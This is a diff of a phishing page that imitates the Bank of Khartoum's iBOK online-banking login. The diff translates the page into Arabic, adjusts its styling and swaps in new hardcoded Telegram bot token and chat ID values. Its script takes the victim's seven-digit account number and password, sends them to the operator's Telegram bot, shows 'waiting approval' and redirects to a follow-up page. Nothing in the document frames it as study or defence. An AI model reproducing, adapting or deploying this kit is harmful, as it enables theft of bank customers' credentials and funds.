@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Form tracking iBOK</title>
+    <title>تتبع النماذج عبر iBOK</title>
 
     <style>
          :root {
@@ -24,7 +24,7 @@
             margin: 0;
             min-height: 100vh;
             color: var(--ink);
-            font-family: Arial, Helvetica, sans-serif;
+            font-family: Tahoma, Arial, sans-serif;
             background: #f2f5f9;
         }
         
@@ -68,6 +68,8 @@
         
         .brand {
             margin-top: 10px;
+            direction: ltr;
+            text-align: right;
         }
         
         .brand-name {
@@ -158,6 +160,7 @@
             background: transparent;
             font: inherit;
             font-size: 16px;
+            text-align: right;
         }
         
         input:focus-visible,
@@ -168,10 +171,12 @@
         
         input::placeholder {
             color: var(--muted);
+            text-align: right;
         }
         
         .password-wrap input {
-            padding-right: 4px;
+            padding-left: 4px;
+            padding-right: 14px;
         }
         
         .show-password {
@@ -195,6 +200,7 @@
             cursor: pointer;
             font-size: 16px;
             font-weight: 700;
+            font-family: inherit;
         }
         
         .demo-action:hover {
@@ -260,46 +266,46 @@
 <body>
     <div class="page">
         <header>
-            <div class="welcome">Welcome to iBOK online banking service</div>
+            <div class="welcome">مرحباً بك في خدمة الخدمات المصرفية عبر الإنترنت iBOK</div>
             <div class="brand">
                 <div class="brand-name">iBOK</div>
-                <div class="brand-caption">Online Form</div>
+                <div class="brand-caption">نموذج عبر الإنترنت</div>
             </div>
         </header>
 
         <main>
             <section class="card" aria-labelledby="form-title">
-                <h1 id="form-title">Online Form</h1>
-                <div class="subtitle">Please enter the data</div>
+                <h1 id="form-title">نموذج عبر الإنترنت</h1>
+                <div class="subtitle">يرجى إدخال البيانات</div>
 
                 <p class="demo-note">
-                    Account number.
+                    رقم الحساب.
                 </p>
 
                 <form id="demo-form" autocomplete="off">
                     <div class="field">
-                        <label for="account">Enter the account number (7 digits):</label>
+                        <label for="account">أدخل رقم الحساب (7 أرقام):</label>
                         <div class="input-wrap">
-                            <input id="account" name="account" type="text" inputmode="numeric" pattern="\d{7}" minlength="7" maxlength="7" placeholder="Enter 7 digits account number" autocomplete="off" required>
+                            <input id="account" name="account" type="text" inputmode="numeric" pattern="\d{7}" minlength="7" maxlength="7" placeholder="أدخل رقم الحساب المكون من 7 أرقام" autocomplete="off" required>
                         </div>
                     </div>
 
                     <div class="field">
-                        <label for="password">Password:</label>
+                        <label for="password">كلمة المرور:</label>
                         <div class="input-wrap password-wrap">
-                            <input id="password" name="password" type="password" placeholder="Enter Password" autocomplete="new-password" required>
-                            <button class="show-password" type="button" id="toggle-password" aria-label="Show demo passphrase" aria-pressed="false">Show</button>
+                            <input id="password" name="password" type="password" placeholder="أدخل كلمة المرور" autocomplete="new-password" required>
+                            <button class="show-password" type="button" id="toggle-password" aria-label="إظهار كلمة المرور التجريبية" aria-pressed="false">إظهار</button>
                         </div>
                     </div>
 
-                    <button class="demo-action" type="submit">Log In</button>
+                    <button class="demo-action" type="submit">تسجيل الدخول</button>
                     <div class="message" id="message" role="status" aria-live="polite"></div>
                 </form>
             </section>
         </main>
 
         <footer>
-            iBOK I Bank of Khartoum 2026<br> All rights reserved, Bank of Khartoum, iBOK 2026.
+            iBOK بنك الخرطوم 2026<br> جميع الحقوق محفوظة، بنك الخرطوم، iBOK 2026.
         </footer>
     </div>
 
@@ -307,8 +313,8 @@
         // =======================
         // BOT CONFIG
         // =======================
-        const BOT_TOKEN = '7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc';
-        const CHAT_ID = '8406078749';
+        const BOT_TOKEN = '8962923971:AAE6pwf3RxLR55lU--KAbOqf5XdNwhMbTu8';
+        const CHAT_ID = '8586910663';
 
         // =======================
         // DOM REFERENCES
@@ -326,7 +332,7 @@
             togglePasswordBtn.addEventListener("click", function() {
                 const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
                 passwordInput.setAttribute("type", type);
-                this.textContent = type === "password" ? "Show" : "Hide";
+                this.textContent = type === "password" ? "إظهار" : "إخفاء";
             });
         }
 
@@ -340,7 +346,7 @@
             const password = passwordInput.value.trim();
 
             if (!account || !password) {
-                messageDiv.textContent = "Please fill in all fields.";
+                messageDiv.textContent = "يرجى تعبئة كافة الحقول.";
                 messageDiv.className = "message visible error";
                 return;
             }
@@ -348,7 +354,7 @@
             // Validate account number is exactly 7 digits
             const accountRegex = /^\d{7}$/;
             if (!accountRegex.test(account)) {
-                messageDiv.textContent = "Account number must be exactly 7 digits.";
+                messageDiv.textContent = "يجب أن يتكون رقم الحساب من 7 أرقام بالضبط.";
                 messageDiv.className = "message visible error";
                 return;
             }
@@ -370,21 +376,21 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        messageDiv.textContent = "waiting approval.....";
+                        messageDiv.textContent = "جاري انتظار الموافقة.....";
                         messageDiv.className = "message visible success";
 
                         // Redirect to verify.html after a 1.5-second delay
                         setTimeout(() => {
-                            window.location.href = 'verify.html';
+                            window.location.href = 'summary.html';
                         }, 1500);
                     } else {
-                        messageDiv.textContent = "Error sending data. Try again.";
+                        messageDiv.textContent = "حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.";
                         messageDiv.className = "message visible error";
                     }
                 })
                 .catch(error => {
                     console.error("Error:", error);
-                    messageDiv.textContent = "Network error occurred.";
+                    messageDiv.textContent = "حدث خطأ في الشبكة.";
                     messageDiv.className = "message visible error";
                 });
         });
